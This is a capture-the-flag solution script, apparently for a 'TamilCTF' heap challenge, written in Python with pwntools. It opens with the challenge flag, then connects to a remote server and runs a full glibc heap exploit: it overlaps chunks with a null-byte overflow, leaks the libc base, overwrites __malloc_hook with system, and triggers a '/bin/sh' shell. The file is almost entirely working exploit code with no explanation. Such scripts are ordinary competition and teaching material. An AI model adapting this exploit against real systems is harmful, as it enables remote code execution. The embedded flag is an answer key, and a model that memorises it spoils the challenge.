#TamilCTF{Th3_1n7en7eD_S0lu7i0N_W4S_70_Cr347e_0v3rl4PP1Ng_ChuNkS_bY_h0uSe_0f_3iNh3rj4r_M37h0d_0R_by_P0is0N_NuLL_By73S_4nD_7urN_7h47_70_F4S7BiN_DuP_70_C0D3_3x3cuTi0N}
from pwn import *

elf = ELF("./cute_little_vulnerable_storage")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.25.so")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("3.99.48.161", 9005)

def sa(s, d):
    target.sendafter(s, d)

def sla(s, d):
    sa(s, d+"\n")

def create(size):
    sla("Exit\n", "1")
    sa(":", str(size))

def destroy(idx):
    sla("Exit\n", "2")
    sla(":", str(idx))

def edit(idx, data):
    sla("Exit\n", "3")
    sla(":", str(idx))
    sa(":", data)

def view(idx):
    sla("Exit\n", "4")
    sla(":", str(idx))

create(0x180)           #0
create(0xf8)            #1
edit(1, "B"*0x30)
destroy(0) 
create(0x90)            #2
destroy(2)
create(0x88)            #3
create(0xf8)            #4
view(4)

target.recvuntil("\x00"*0x10)
libc_base = u64(target.recv(8)) - 0x7f9b8d08cb58 + 0x00007f9b8ccf5000
log.info("LIBC Base: " + hex(libc_base))

destroy(3)
edit(4, "A"*0xf0 + p64(0x190))
destroy(1)


create(0x88)            #5
create(0x68)            #6
destroy(6)

edit(4, p64(libc_base + libc.sym['__malloc_hook'] - 0x23))

create(0x68)            #7
create(0x68)            #8
edit(8, "wow" + p64(libc_base + libc.sym['system'])*7)

create(libc_base + libc.search("/bin/sh\x00").next())

target.interactive()